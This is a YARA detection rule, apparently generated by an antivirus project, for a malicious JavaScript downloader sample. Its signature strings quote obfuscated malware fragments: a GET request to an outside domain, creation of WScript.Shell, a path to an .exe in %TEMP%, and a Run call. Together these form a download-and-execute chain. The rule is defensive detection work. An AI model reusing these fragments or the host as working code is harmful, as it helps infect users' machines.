rule sig_20160401_cdc981dbbb14b13ffb7b4cb7f7698f51 {
  meta:
    description = "datamaliciousorder - file 20160401_cdc981dbbb14b13ffb7b4cb7f7698f51.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b040e687be8d31ee6c1a8e80595f728906c50b4c16bda674712a8b9a6680d47c"

  strings:
    $s1  = "GncUg[XqMig](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function EkzIfm(YeyEk, YpKpq){QtaLot = QtaLot * 1; return YeyEk - YpKpq;};" fullword ascii
    $s3  = "var PvrFd = function XprGr() {return WScript[LzcFjd](\"WScript\"+\".Shell\");}(), MuYzy = 11;" fullword ascii
    $s4  = "if (GncUg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MyLyo(){return GnkAz + \"\";};" fullword ascii
    $s6  = "function QhUl() {return PvrFd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1PREvMqh.ex\" + \"e\";};" fullword ascii
    $s7  = "function XmkDpw() {return ((KnpDe == true) && (KnpDe == BiPin)) ? 1 : QtaLot;};" fullword ascii
    $s8  = "function WzNl(){return 23;};" fullword ascii
    $s9  = "var BiPin = false;" fullword ascii
    $s10 = "function IsVs(FeJzw) {var HhPw = (1, 2, 3, 4, 5, FeJzw); return HhPw;};" fullword ascii
    $s11 = "function UiIv(){return LzcFjd;};" fullword ascii
    $s12 = "function BgQf(LfmUlo){PvrFd[\"R\"+\"un\"](LfmUlo, QtaLot, QtaLot);};" fullword ascii
    $s13 = "BiPin = true; " fullword ascii
    $s14 = "var KnpDe = false;" fullword ascii
    $s15 = "function RzNj()" fullword ascii
    $s16 = "var BcnWw = new this[\"Date\"]();" fullword ascii
    $s17 = "}while (JnMja);" fullword ascii
    $s18 = "KnpDe = true; " fullword ascii
    $s19 = "var UoZhm = false;" fullword ascii
    $s20 = "return EkzIfm(CfIam, AvvRd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}